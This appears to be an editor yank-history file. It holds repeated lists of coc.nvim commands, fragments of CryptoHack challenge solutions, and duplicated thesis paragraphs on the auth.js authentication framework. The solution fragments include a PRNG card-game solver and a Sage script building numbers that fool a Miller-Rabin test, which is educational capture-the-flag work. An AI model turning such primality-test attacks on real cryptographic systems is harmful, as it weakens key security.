	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	editor.action.organizeImport	run organize import code action.
	java.open.formatter.settings	Open Java formatter settings
	sh.update.bash-language-server	Update bash-language-server
c182b57436b721e0d11383049d2b1ecb|list:/commands|18|1|V|list
	python.setLinter	Select Linter
	python.startREPL	Start REPL
	python.runLinting	Run Linting
	python.viewOutput	Show output
	python.sortImports	Sort Imports
	python.enableLinting	Enable Linting
	python.createTerminal	Create Terminal
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.goToPythonObject	Go to Python Object
	python.updateSparkLibrary
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.setShebangInterpreter
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	go.playground	Run on go playground
	go.install.goplay	Install / update goplay
	document.jumpToNextSymbol	Jump to next symbol highlight position.
b5091994095d99ac9e6c0de265dcc483|list:/commands|18|1|V|list
	python.setLinter	Select Linter
	python.startREPL	Start REPL
	python.runLinting	Run Linting
	python.viewOutput	Show output
	python.sortImports	Sort Imports
	python.enableLinting	Enable Linting
	python.createTerminal	Create Terminal
	python.execInTerminal	Run Python File in Terminal
	python.setInterpreter	Select Interpreter
	python.goToPythonObject	Go to Python Object
	python.updateSparkLibrary
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.setShebangInterpreter
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
065ff6ef8433aa30c5203efeaec7b96e|list:/commands|10|1|V|list
	python.setLinter	Select Linter
	python.startREPL	Start REPL
	python.sortImports	Sort Imports
	python.setInterpreter	Select Interpreter
	python.setShebangInterpreter
	python.updateSparkLibrary
	python.execSelectionInTerminal
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.execSelectionInDjangoShell
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
d86dd5f7564752da26e219c787296326|list:/commands|7|1|V|list
	python.setLinter	Select Linter
	python.setInterpreter	Select Interpreter
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.startREPL	Start REPL
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.buildWorkspaceSymbols	Build Workspace Symbols
8ac37782f3a1ecced2311f09ea34a8a8|list:/commands|44|1|V|list
	python.setLinter	Select Linter
	prettier.formatFile
	python.setInterpreter	Select Interpreter
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	snippets.editSnippets	Edit user snippets file of current document filetype.
	workspace.showOutput	open output buffer to show output from languageservers or extensions.
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	document.renameCurrentWord	rename word under cursor in current buffer by use multiple cursors.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	go.install.gomodifytags	Install / update gomodifytags
	go.install.goplay	Install / update goplay
	go.install.gopls	Install / update gopls
	go.install.gotests	Install / update gotests
	go.playground	Run on go playground
	go.tags.add	Add tags to struct fields
	go.tags.add.line	Add tags to struct field in current line
	go.tags.add.prompt	Add tags to struct fields (prompt)
	go.tags.clear	Remove all tags from struct fields
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove	Remove tags from struct fields
	go.tags.remove.line	Remove tags from struct field in current line
	go.tags.remove.prompt	Remove tags from struct fields (prompt)
	go.test.generate.exported	Generate unit tests for exported functions in file
	go.test.generate.file	Generate unit tests for file
	go.test.toggle	Toggle test file
	go.version	Print extension version
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.clean.workspace	Clean the Java language server workspace
	session.save	Save current vim state to session file.
	session.load	Load session by name.
	session.restart	Restart vim with current session.
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.sortImports	Sort Imports
	python.startREPL	Start REPL
	python.createTerminal	Create Terminal
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.execInTerminal	Run Python File in Terminal
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	python.viewOutput	Show output
	python.goToPythonObject	Go to Python Object
	python.enableLinting	Enable Linting
	python.runLinting	Run Linting
	sh.version	Print extension version
	sh.update.bash-language-server	Update bash-language-server
	tsserver.reloadProjects	Reload current project
	tsserver.openTsServerLog	Open log file of tsserver.
	tsserver.goToProjectConfig	Open project config file.
	tsserver.restart	Restart tsserver
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	tsserver.executeAutofix	Fix autofixable problems of current document.
	editor.action.organizeImport	run organize import code action.
	extensions.forceUpdateAll
	tags.generate
	prettier.open-output
	python.setShebangInterpreter
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	python.updateSparkLibrary
	yank.clean
9f0e145ceb5cc447a805a789ccd4b8cb|list:/commands|12|1|V|list
	sh.update.bash-language-server	Update bash-language-server
	python.setLinter	Select Linter
	python.runLinting	Run Linting
	java.open.serverLog	Open Java Language Server log file
	python.enableLinting	Enable Linting
	tsserver.openTsServerLog	Open log file of tsserver.
	python.updateSparkLibrary
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	session.load	Load session by name.
	python.upgradePythonLanguageServer	Upgrade MPLS to latest stable version, restart coc.nvim required to take effect.
	go.tags.add.line	Add tags to struct field in current line
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove.line	Remove tags from struct field in current line
	yank.clean
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	go.playground	Run on go playground
	go.tags.clear	Remove all tags from struct fields
	go.test.toggle	Toggle test file
	go.install.gopls	Install / update gopls
	python.startREPL	Start REPL
	go.install.goplay	Install / update goplay
	go.install.gotests	Install / update gotests
	prettier.formatFile
	tsserver.watchBuild	Run `tsc --watch` for current project by use vim's job feature.
	java.clean.workspace	Clean the Java language server workspace
	go.test.generate.file	Generate unit tests for file
	python.createTerminal	Create Terminal
	python.execInTerminal	Run Python File in Terminal
	java.workspace.compile	Force Java compilation
	go.install.gomodifytags	Install / update gomodifytags
	tsserver.reloadProjects	Reload current project
	workspace.clearWatchman	run watch-del-all for watchman to free up memory.
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	extensions.forceUpdateAll
	snippets.openSnippetFiles	Edit snippets files of current document filetype.
	workspace.workspaceFolders	show opened workspaceFolders.
	workspace.diagnosticRelated	jump to related locations of current diagnostic.
	workspace.renameCurrentFile	change current filename to a new name and reload it.
	extensions.toggleAutoUpdate	toggle auto update of extensions.
	python.buildWorkspaceSymbols	Build Workspace Symbols
	python.enableSourceMapSupport	Enable source map support for extension debugging
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
eadb48ca7c4f15bffd2a922962d745aa|list:/commands|9|1|V|list
	python.setLinter	Select Linter
	python.runLinting	Run Linting
	python.enableLinting	Enable Linting
	python.updateSparkLibrary
	go.tags.add.line	Add tags to struct field in current line
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove.line	Remove tags from struct field in current line
	mru.validate	Validate mru files list, which remove files that doesn't exist.
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
	go.install.gomodifytags	Install / update gomodifytags
8970b73005b87067d289e00cebff2b60|list:/commands|3|1|V|list
	python.setLinter	Select Linter
	python.runLinting	Run Linting
	python.enableLinting	Enable Linting
	go.tags.add.line	Add tags to struct field in current line
	go.tags.clear.line	Remove all tags from struct fields in current line
	go.tags.remove.line	Remove tags from struct field in current line
	python.execSelectionInTerminal
	python.execSelectionInDjangoShell
43866277788676abf27a93075fbd6f5a|list:/commands|3|1|V|list
	python.setLinter	Select Linter
	python.execSelectionInTerminal
9acdbfcd4ce953f2d6a518e445293aaa|list:/commands|13|1|V|list
	java.open.serverLog	Open Java Language Server log file
	java.clean.workspace	Clean the Java language server workspace
	java.workspace.compile	Force Java compilation
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.action.organizeImports	Organize Imports
	java.open.formatter.settings	Open Java formatter settings
	java.projectConfiguration.update	Update project configuration
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	python.goToPythonObject	Go to Python Object
	tsserver.reloadProjects	Reload current project
	tsserver.goToProjectConfig	Open project config file.
	python.execSelectionInDjangoShell
30cb13a75e26f7d7d59553697540b5c4|list:/commands|2|1|V|list
	python.goToPythonObject	Go to Python Object
	tsserver.reloadProjects	Reload current project
	tsserver.goToProjectConfig	Open project config file.
	java.projectConfiguration.update	Update project configuration
	java.open.serverLog	Open Java Language Server log file
	java.clean.workspace	Clean the Java language server workspace
	java.open.formatter.settings	Open Java formatter settings
	java.updateLanguageServer	Download latest snapshots of jdt.ls from eclipse.org.
	java.workspace.compile	Force Java compilation
	java.action.organizeImports	Organize Imports
	document.jumpToNextSymbol	Jump to next symbol highlight position.
	python.execSelectionInDjangoShell
aab10bf9cbabe9e131865897cee9e5bd|list:/commands|2|1|V|list
	java.projectConfiguration.update	Update project configuration
537bbf95d321ae7a7f063a480aef8b7d|file:///home/neo/.config/coc/extensions/node_modules/coc-python/lib/index.js|114003|26|v|javascript
	/usr/local/lib/python2.7/dist-packages/jedi-0.17.1-py2.7.egg
32030ef34d2892af760feb66168b643c|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|39|1|V|python
	prin
a564c48a9f2540c585c748b5ed11aca8|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|39|1|V|python
	print(next_shuffle)
5ccadbc67cff2371534004154747ddc2|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|38|1|V|python
	next_shuffle = msg.split().index('round')+1
a1e8f81c3f51b3205b23181f78017fc0|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|38|27|v|python
	.index('round')+1
76ecb030176be268c9e3f0cd6470909f|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|33|1|V|python
	print(deck)
b3e02ee24f9f01423d820e54efbf6675|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|40|1|V|python
	for i in range(next_shuffle-1, -1, -1):
01e1af58e555e3ac4825b1099e3104c5|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|41|16|v|python
	next_shuffle-1, -1, -1
6b540c15a455e4dafd710d3593d804f8|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|49|5|V|python
	    card_num = deck[cards.pop()]
15353904ae1c3de2c961094efdfb6b38|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|46|5|v|python
	card_num
15dd32fc7dcc4597f76142ebaedcc823|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|41|1|V|python
	print(cards.pop())
46f68c9c5ac1622157f0991959df2b47|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|49|5|V|python
	    print(Card(value,suit))
a1f1fd39b36f073499b167ea382edee3|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|24|2|V|python
	        return self.value == other.value
492d095615591279f3511cb8765925b3|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|49|5|V|python
	    card = deck.index(str(Card(value, suit)))
1d3b533f80fdc2b5d64617e7ca6f8fcc|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|50|5|V|python
	    print(card)
95d8412189d22ce382a90ff733b4cf0f|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|46|5|V|python
	    hand = str(deck[cards.pop()]).split()
5a631ebed263bfb0d462073a786b3d16|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|42|1|V|python
	for i in range(2,-1,-1):
b0212c2589084fbb54203050cf12cafc|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|53|1|V|python
	print(deck[5])
0af2feb786a992400ae5813e35779db6|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|53|1|V|python
	print(rand_num)
4ac3dcdffbe8339866a90ec4f599d010|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|50|1|V|python
	for i in range(100): json_send({"choice":"l"})
	    print(json_recv())
	
	print(json_recv())
26cd43bef6b17ac477a73e948634933c|file:///home/neo/cryptohack/misc/el-gamal/source.py|28|1|V|python
	q = 117477667918738952579183719876352811442282667176975299658506388983916794266542270944999203435163206062215810775822922421123910464455461286519153688505926472313006014806485076205663018026742480181999336912300022514436004673587192018846621666145334296696433207116469994110066128730623149834083870252895489152123
af9454bc3e4ed5d13ceb6ea89a0d7c27|file:///home/neo/cryptohack/misc/el-gamal/source.py|29|1|V|python
	g = 104831378861792918406603185872102963672377675787070244288476520132867186367073243128721932355048896327567834691503031058630891431160772435946803430038048387919820523845278192892527138537973452950296897433212693740878617106403233353998322359462259883977147097970627584785653515124418036488904398507208057206926
7345634c6d6c6b8a2074bd29b0a426a4|file:///home/neo/cryptohack/misc/el-gamal/output.txt|1|13|v|text
	0x35f4ff5a5d20b34f2792d3c8ef1593e20ea41ec6d0813cd0895a5217388385392a33ca2d85be5e4912cd6a785d137266fea393fecbbb62de6fdf4aa948c4b016be426bb86bca4ab4abd6663b8696ac4796a43b47e7e9d4a5a118f8c9a2ef9d87ec02df4528c4df7cd002f8e6ee3ee76d8d86b2f39d72078b860745887c9bc649
c67189494e1ceb5af24d3a9a0b6cd4d7|file:///home/neo/cryptohack/general/mathematics2/13385.py|8|1|V|python
	def generate_basis(n):
	    basis = [True] * n
	    for i in range(3, int(n**0.5)+1, 2):
	        if basis[i]:
	            basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1)
	    return [2] + [i for i in range(3, n, 2) if basis[i]]
754c9d1962171cfef84d2e9944a8522f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|3|1|v|python
	....: 
5c3d4f9f0474547d6a0cbe145de8a6a7|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|8|19|V|python
	        if p > 4*a:
	            break
4fe232d9a08d3ba65de6748b4b8ea661|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|6|15|v|python
	 and p != 2 and p < 4*a:
15b2237cd92776ac42904bb66f03db3a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|15|9|V|python
	        res =IntegerMod(A, IntegerMod(R,a^((p-1)/2)))
b44c46c18997e01fe89aecf9af1bba63|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|14|9|V|python
	        R = IntegerModRing(p)
b5674b4f25cfd6f2425966363dd96760|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|16|9|V|python
	        # if res != 0 and res !=1:
0267804f2837e22871a589475c39576e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|6|31|V|python
	    # N = [x%4*a for x in range(4*a) if kronecker(x,a)==-1]
	    # print(N)
df720d7f588aaaf5b26dad57c7d85708|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|6|5|V|python
	    cand = []
9516dfb15f51c7ee19a4d46b8c0dbe1d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|16|26|v|python
	append
085a0ede77d0aae799af0ec250618987|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|13|1|v|python
	            for num in range(2,4*a,1):
3b0d8bfa483a10173e18d313f6ede2c0|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|14|1|V|python
	            # for num in range(2,4*a,1):
	            #     res = kronecker(num,4*a)
	            #     if res == 1:
	            #         cand.add(IntegerMod(A, num))
2ad3edde70f7f6ab9d6547794ba0cf54|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|14|11|v|python
	cand
b3db70a69d4991d4d27502ef6867c115|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|9|17|V|python
	    # for p in P:
	        # if p == 2:
	        #     continue
53b45af25ec6f0f08b2031e0d8d73467|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|9|9|V|python
	        if p > 1000000:
	            break
675cb748ff41844721a8642caa8b2fe2|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|12|5|v|python
	print(sorted(cand))
ab9a1163b330ca9c5e0403472edf69c3|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|17|1|V|python
	print(Sa)
210ce7d899ff2d848e61bfc3d460dfd9|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|15|6|V|python
	k1 = 1
	k2 = 41
	k3 = 101
9f01eb77b2b6597d526573bc29d13751|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|18|5|V|python
	    for num in s:
2d93b575b6d9268fe38ee36c58e69fd6|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|1|1|V|python
	P = Primes()
	Sa = []
	for a in P:
	    if a > 30:
	        break
	    A = IntegerModRing(4*a)
	    cand = set()
	    for i in range(1,30000):
	        p = P.unrank(i)
	        if kronecker(a, p) == -1:
	            cand.add(IntegerMod(A, p))
	    Sa.append(cand)
5de4ea25460d61d666962f51b5c82593|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|7|10|V|python
	    if a > 30:
	        break
e4fdc8c52c809f79542476b5455c0f18|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|4|1|V|python
	P.next()
41d7368eb47821518a1bff679894eaf3|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|22|5|V|python
	    print(Sa)
9af114c76abbb99195e68d8481b81a1a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|24|9|V|python
	        req = set()
2c8a19080b10540590e752ccbc3e415e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|30|9|V|python
	        sb
4d3be1c35a72b9362b25c30b36654b4f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|18|10|v|python
	set()
1123e540ebd12a012319f2f88c5848fb|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|28|21|v|python
	IntegerMod(A, inv*(s+k-1))
26decc94d83c358f67f11c3cbd99b126|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|31|30|v|python
	sorted
65e7fe24e8ec5b8595b9036086978d86|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|27|9|V|python
	        print("K:", k)
f3f3918b83f7786f5d58765e24536fd2|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|28|9|V|python
	            print(IntegerMod(A, inv*(s+k-1)))
9b84497fbf722a75868538c15e2082c2|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|21|5|V|python
	    print('Sa:', Sa)
5d91e55312fdea860c7ac29898db4492|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|37|11|v|python
	4, bases
58c712635d8f6c9d1e6b1e7edde0bfa0|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|35|1|V|python
	print(bases)
f266c4cc229f8378fab3c678872f4f3f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|5|1|V|python
	for i in range(18):
53af6df5e542c9f9018d3882a408e383|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|40|1|V|python
	print(lcm(tmp_b))
a20c8c58efaedfe8bcf74ff13985af6a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|41|18|v|python
	bases
eb29f1eeb934028d3fa2822766bc2c23|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|46|25|v|python
	Sk[1]
720b0a885e6ab38b29366ba42ba33403|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|46|1|V|python
	print(Sk[2])
209a9a7e61ab0c5e8cc1e692351e5958|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|46|1|V|python
	print(inverse_mod(Sk[2],Sk[1]))
46214daa345539bab41332ae9a790591|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|40|1|V|python
	Sa.append(41)
69cb1995b5b42adfb92dee097176534e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|40|1|V|python
	Sa.append(101)
96c97c34ad57e904c3e153cc07780194|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|44|1|V|python
	# tmp_b = bases[::]
	# tmp_b.append(4)
	# for a in bases:
	#     tmp_b.append(a)
	# for a in choice:
	#     tmp_b.append(a)
	# n = lcm(tmp_b)
	# print(inverse_mod(Sk[2],Sk[1]))
	# print(inverse_mod(Sk[1],Sk[2]))
	
	
	
	        
b384553dc7bc273facf5ebf977c9e246|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|38|37|v|python
	,28,32
d85e32f7a74c7e0c350fa3c82a655468|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|39|1|V|python
	choice.append()
d0b1d9c91d62d9ddc926ba937dab18ac|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|39|1|V|python
	choice.append(inverse_mod((Sk[1]-1*Sk[2], Sk[1])))
3bb03b0803b917563e762fe7b346717c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|44|9|V|python
	print(CRT_list(choice,Sa))
	print(lcm(Sa))
5cf5c5667f3f52af459df654fd217a43|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|57|1|V|python
	print(p1 % mod)
63d6e879fc9d706bc46e4c18da5c1e66|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|56|1|V|python
	print(p1)
1db44e0ec402caa85d0583aceea7fab8|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|54|9|V|python
	        break
84ee121f064056fc606beea4e503c3bf|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/prime_and_prejudice.sage|53|8|V|python
	        print(p1)
f6a2b12f426f23b784fbd84973736e3a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|54|1|V|python
	        q = (p1-1)/2
	        p2 = (4*q) + 1
	        p3 = (8*q) + 1
9693eb928c9081912c13a5bf51b3640d|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|58|13|V|python
	            print(n.nbits())
8feb99820004ea7b09a52ca03165e418|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|59|13|V|python
	            print(bit_length)
9d506a144f7aabacf02c53c258da526a|file:///home/neo/cryptohack/general/mathematics2/prime_and_prejudice.sage|1|1|V|python
	P = Primes()
	Sb = []
	bases = []
	p = 1
	# for i in range(18):
	for i in range(10):
	    p = P.next(p)
	    bases.append(p)
	print(bases)
	
	for a in bases:
	    A = IntegerModRing(4*a)
	    Sa = set()
	    for i in range(1,30000):
	        p = P.unrank(i)
	        if kronecker(a, p) == -1:
	            Sa.add(IntegerMod(A, p))
	    Sb.append(sorted(Sa))
	
	Sk = [1, 41, 101]
	new_Sb = []
	
	for i,Sa in enumerate(Sb):
	    a = bases[i]
	    tmp_Sa = set(Sa)
	    A = IntegerModRing(4*a)
	    for k in Sk:
	        req = set()
	        inv = inverse_mod(k,4*a)
	        for s in Sa:
	            req.add(IntegerMod(A, inv*(s+k-1)))
	        tmp_Sa = tmp_Sa.intersection(req)
	    new_Sb.append(tmp_Sa)
	
	for Sa in new_Sb:
	    print(sorted(set(Sa)))
dc6ce5d6939a8cc397d84579392bd1cb|file:///home/neo/cryptohack/general/mathematics2/13385.py|8|1|V|python
	def generate_basis(n):
	    basis = [True] * n
	    for i in range(3, int(n**0.5)+1, 2):
	        if basis[i]:
	            basis[i*i::2*i] = [False]*((n-i*i-1)//(2*i)+1)
	    return [2] + [i for i in range(3, n, 2) if basis[i]]
	
	
	def miller_rabin(n, b):
	    """
	    Miller Rabin test testing over all
	    prime basis < b
	    """
	    basis = generate_basis(b)
	    if n == 2 or n == 3:
	        return True
	
	    if n % 2 == 0:
	        return False
	
	    r, s = 0, n - 1
	    while s % 2 == 0:
	        r += 1
	        s //= 2
	    for b in basis:
	        x = pow(b, s, n)
	        if x == 1 or x == n - 1:
	            continue
	        for _ in range(r - 1):
	            x = pow(x, 2, n)
	            if x == n - 1:
	                break
	        else:
	            return False
	    return True
	
2a25524dd104ebbfc2fc1162ae6f13fb|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|47|1|V|tex
	Unfortunately, Keybase implements all this functionality, including the cryptographic
	operations, using its own code and does not use the browser's engine to do so.
	A web site may advertise that it supports a Keybase-like authentication process, where the 
	password of the user is never revealed to the server, in order to convince users to register with it.
	However, unless the cryptographic primitives are executed in a secure context,
	it is unclear whether the aforementioned web site implements the authentication
	algorithm correctly or deliberately violates it in order to read the user's password.
	
	In this paper, we build a framework for allowing any web site to offer advanced
	authentication, where plain passwords are used but are never exposed to any server.
	In particular, we design, implement and evaluate {\tt auth.js}, an
	authentication framework with a JavaScript interface, which allows developers
	to enable any PAKE-like protocol in their apps. As a proof-of-concept, we use
	{\tt auth.js} to enable Keybase-like authentication to WordPress with just a
	few code modifications. {\tt auth.js} can be used through JavaScript, however,
	all cryptographic primitives are enforced by the browser engine, which we assume
	trusted. For this, we extend Mozilla Crypto with more cryptographic
	primitives, such as {\tt scrypt} and the edwards25519 elliptic curve.
	
	\subsection{Contributions}
	To summarize, this paper contributes:
	
	\begin{itemize}
	
	\item we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve --although this is a solely engineering
	task, we consider it important for enabling new cryptographic capabilities for
	web applications;
	
	\item we design and realize {\tt auth.js}, a framework that allows a web
	application to offer advanced authentication that leverages sophisticated
	techniques compared to typical cryptographically hashed text-based passwords;
	
	\item {\tt auth.js} can be easily enabled in all web applications and supports
	traditional passwords -- however, once enabled, switching to a more elaborate
	scheme is straight forward; 
	
	\item we evaluate {\tt auth.js} with real web applications, such as WordPress.
	Enabling \pname{} in WordPress requires
	modifying about 50 LoCs of
	the main authentication code and adding 50 LoCs for
	enabling password recovery and signature validation.
	
	
	
	
	\end{itemize}
db3c7d83d3f410ec9e3840f799834a2e|file:///home/neo/Documents/thesis/introduction.tex|46|1|V|tex
	
	Unfortunately, Keybase implements all this functionality, including the cryptographic
	operations, using its own code and does not use the browser's engine to do so.
	A web site may advertise that supports a Keybase-like authentication process, where the 
	password of the user is never revealed to the server, in order to convince users to register with it.
	However, unless the cryptographic primitives are executed in a secure context,
	it is unclear whether the aforementioned web site implements the authentication
	algorithm correctly or deliberately violates it in order to read the user's password.
	
	In this thesis, we build a framework for allowing any web site to offer advanced
	authentication, where plain passwords are used but are never exposed to any server.
	In particular, we design, implement and evaluate {\tt auth.js}, an
	authentication framework with a JavaScript interface, which allows developers
	to enable any PAKE-like protocol in their apps. As a proof-of-concept, we use
	{\tt auth.js} to enable Keybase-like authentication to WordPress with just a
	few code modifications. {\tt auth.js} can be used through JavaScript, however,
	all cryptographic primitives are enforced by the browser engine, which we assume
	trusted. For this, we extend Mozilla Crypto with more cryptographic
	primitives, such as {\tt scrypt} and the edwards25519 elliptic curve.
	
	\section{Contributions}
	To summarize, this thesis contributes:
	
	\begin{itemize}
	
	\item we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve --although this is a solely engineering
	task, we consider it important for enabling new cryptographic capabilities for
	web applications;
	
	\item we design and realize {\tt auth.js}, a framework that allows a web
	application to offer advanced authentication that leverages sophisticated
	techniques compared to typical cryptographically hashed text-based passwords;
	
	\item {\tt auth.js} can be easily enabled in all web applications and supports
	traditional passwords -- however, once enabled, switching to a more elaborate
	scheme is straight forward; 
	
	\item we evaluate {\tt auth.js} with real web applications, such as WordPress.
	
	\end{itemize}
f793fe6a2d7291dbf8edeb30a63071eb|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|48|1|V|tex
	Unfortunately, Keybase implements all this functionality, including the cryptographic
	operations, using its own code and does not use the browser's engine to do so.
	A web site may advertise that it supports a Keybase-like authentication process, where the 
	password of the user is never revealed to the server, in order to convince users to register with it.
	However, unless the cryptographic primitives are executed in a secure context,
	it is unclear whether the aforementioned web site implements the authentication
	algorithm correctly or deliberately violates it in order to read the user's password.
	
	In this paper, we build a framework for allowing any web site to offer advanced
	authentication, where plain passwords are used but are never exposed to any server.
	In particular, we design, implement and evaluate {\tt auth.js}, an
	authentication framework with a JavaScript interface, which allows developers
	to enable any PAKE-like protocol in their apps. As a proof-of-concept, we use
	{\tt auth.js} to enable Keybase-like authentication to WordPress with just a
